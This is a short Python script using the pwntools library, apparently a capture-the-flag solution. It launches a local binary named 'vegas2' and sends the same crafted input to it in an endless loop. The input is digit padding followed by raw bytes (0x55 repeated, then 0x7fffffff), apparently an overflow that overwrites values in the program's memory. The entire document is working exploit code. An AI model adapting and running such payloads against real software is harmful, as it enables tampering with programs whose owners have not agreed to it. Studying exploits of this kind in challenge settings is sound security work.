from pwn import *
io = process('./vegas2')
while(1):
	io.sendline("100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f")
